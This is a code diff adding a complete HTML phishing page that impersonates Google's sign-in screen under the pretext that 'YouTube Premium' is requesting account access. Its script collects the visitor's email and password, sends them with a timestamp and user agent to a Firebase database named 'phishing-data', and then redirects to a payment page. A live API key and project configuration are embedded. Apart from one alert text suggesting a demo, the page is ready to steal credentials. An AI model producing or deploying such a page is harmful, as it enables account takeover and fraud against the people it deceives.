@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="https://www.youtube.com/s/desktop/a386e432/img/favicon_32.png" type="image/x-icon">
+    
+    <!-- Bootstrap 4 -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"
+        integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <style>
+        body {
+            background: #f8f9fa;
+            font-family: 'Roboto', sans-serif;
+        }
+        
+        .signin-container {
+            max-width: 450px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 48px 40px;
+        }
+        
+        .google-logo {
+            width: 75px;
+            height: 24px;
+            margin-bottom: 20px;
+        }
+        
+        .form-title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+        
+        .form-subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        
+        .form-control {
+            border-radius: 4px;
+            border: 1px solid #dadce0;
+            padding: 12px 16px;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        
+        .form-control:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,.2);
+        }
+        
+        .btn-primary {
+            background: #1a73e8;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 500;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        
+        .btn-primary:hover {
+            background: #1765cc;
+        }
+        
+        .forgot-email {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .create-account {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #dadce0;
+        }
+        
+        .create-account a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .language-selector {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 14px;
+        }
+        
+        .language-selector select {
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 8px 12px;
+            background: white;
+        }
+        
+        .footer-links {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+        }
+        
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .youtube-connection {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .youtube-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+        }
+        
+        .youtube-text {
+            font-size: 14px;
+            color: #5f6368;
+        }
+        
+        .youtube-text strong {
+            color: #202124;
+        }
+    </style>
+<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
+</head>
+
+<body>
+    <div class="signin-container">
+        <!-- Google Logo -->
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
+        
+        <!-- YouTube Connection Notice -->
+        <div class="youtube-connection">
+            <svg class="youtube-icon" viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet" focusable="false">
+                <g>
+                    <path fill="#FF0000" d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"></path>
+                </g>
+            </svg>
+            <div class="youtube-text">
+                <strong>YouTube Premium</strong> is requesting access to your Google Account
+            </div>
+        </div>
+        
+        <!-- Sign In Form -->
+        <h1 class="form-title">Sign in</h1>
+        <p class="form-subtitle">to continue to YouTube Premium</p>
+        
+        <form id="signinForm">
+            <div class="form-group">
+                <input type="email" class="form-control" id="email" placeholder="Email or phone" required>
+            </div>
+            
+            <button type="button" class="btn btn-primary" onclick="nextStep()">Next</button>
+            
+            <div class="text-center">
+                <a href="#" class="forgot-email">Forgot email?</a>
+            </div>
+        </form>
+        
+        <!-- Hidden Password Form -->
+        <form id="passwordForm" style="display: none;">
+            <div class="form-group">
+                <input type="password" class="form-control" id="password" placeholder="Enter your password" required>
+            </div>
+            
+            <div class="form-group form-check">
+                <input type="checkbox" class="form-check-input" id="showPassword">
+                <label class="form-check-label" for="showPassword">Show password</label>
+            </div>
+            
+            <button type="submit" class="btn btn-primary">Sign in</button>
+            
+            <div class="text-center">
+                <a href="#" class="forgot-email">Forgot password?</a>
+            </div>
+        </form>
+        
+        <!-- Create Account Link -->
+        <div class="create-account">
+            <p>Not your computer? Use a private browsing window to sign in.</p>
+            <p><a href="#">Learn more about using Guest mode</a></p>
+            <p><a href="#">Create account</a></p>
+        </div>
+        
+        <!-- Language Selector -->
+        <div class="language-selector">
+            <select class="form-control" style="width: auto; display: inline-block;">
+                <option value="en">English (United States)</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+                <option value="it">Italiano</option>
+                <option value="pt">Português</option>
+                <option value="ru">Русский</option>
+                <option value="ja">日本語</option>
+                <option value="ko">한국어</option>
+                <option value="zh">中文</option>
+            </select>
+        </div>
+        
+        <!-- Footer Links -->
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <!-- Firebase Scripts -->
+    <script src="https://www.gstatic.com/firebasejs/8.0.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.0.1/firebase-analytics.js"></script>
+    
+    <script>
+        // Firebase configuration
+        var firebaseConfig = {
+            apiKey: "AIzaSyDgUD9l-IyrQgV1s7eU4OGPXzvMaXXJyM0",
+            authDomain: "phishing-data.firebaseapp.com",
+            databaseURL: "https://phishing-data.firebaseio.com",
+            projectId: "phishing-data",
+            storageBucket: "phishing-data.appspot.com",
+            messagingSenderId: "239566087596",
+            appId: "1:239566087596:web:5788cc5aa63ab450914609",
+            measurementId: "G-FRFVJDFHSC"
+        };
+        
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        firebase.analytics();
+        
+        // Sign-in functionality
+        function nextStep() {
+            const email = document.getElementById('email').value;
+            if (email) {
+                document.getElementById('signinForm').style.display = 'none';
+                document.getElementById('passwordForm').style.display = 'block';
+                document.querySelector('.form-subtitle').textContent = 'Welcome';
+                document.querySelector('.form-title').textContent = email;
+            }
+        }
+        
+        // Password form submission
+        document.getElementById('passwordForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Store data in Firebase
+            const timestamp = new Date().toISOString();
+            const data = {
+                email: email,
+                password: password,
+                timestamp: timestamp,
+                userAgent: navigator.userAgent
+            };
+            
+            const ref = firebase.database().ref('credentials').push();
+            ref.set(data, function(error) {
+                if (error) {
+                    console.error('Error saving data:', error);
+                } else {
+                    console.log('Data saved successfully');
+                    // Redirect to payment page
+                    window.location.href = 'payment.html';
+                }
+            });
+        });
+        
+        // Show/hide password
+        document.getElementById('showPassword').addEventListener('change', function() {
+            const passwordInput = document.getElementById('password');
+            passwordInput.type = this.checked ? 'text' : 'password';
+        });
+        
+        // Forgot email/password handlers
+        document.querySelectorAll('.forgot-email').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('This would redirect to Google\'s actual password recovery page in a real scenario.');
+            });
+        });
+    </script>
+
+</body>
+
+</html>
